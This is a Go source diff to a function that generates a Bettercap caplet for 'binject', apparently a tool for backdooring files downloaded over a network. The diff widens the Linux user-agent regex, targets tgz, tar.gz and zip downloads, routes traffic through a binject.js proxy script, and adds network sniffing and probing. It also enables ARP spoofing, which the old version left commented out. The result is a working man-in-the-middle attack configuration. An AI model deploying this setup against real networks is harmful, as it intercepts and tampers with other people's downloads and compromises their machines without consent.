@@ -8,8 +8,11 @@ import (
 // GenerateCaplet - generates the binject caplet file from template
 func GenerateCaplet(filename string) error {
 	templ :=
-		`set binject.devices linux
-set binject.useragent.linux    Linux
+		`
+# Bettercap will treat all these as strings but add / to the beginning and end, making them into regex
+# !!! DO NOT USE QUOTES HERE !!!
+set binject.devices linux
+set binject.useragent.linux    .*Linux.*|.*linux.*
 set binject.extensions.linux    tgz,tar.gz,zip
 set http.proxy.script binject.js
 
@@ -18,11 +21,19 @@ set http.proxy.script binject.js
 # start proxy
 http.proxy on
 
-# wait for everything to start properly
+# Turn on net.sniff
+net.sniff on
+# Turn on net.probe for 5 seconds - this REALLY helps find all devices on the net. 
+net.probe on
+# sleep for 5 seconds and wait for probing to be done
+sleep 5
+# turn net.probe off
+net.probe off
+# sleep one more second for safety 
 sleep 1
-
-# uncomment if you want arp spoofing (make sure probing is off as it conflicts with arp spoofing)
-# arp.spoof on
+# be aware that net.probe and arp.spoof cannot run at the same time
+# turn arp spoofing on 
+arp.spoof on
 `
 
 	f, err := os.Create(filename)
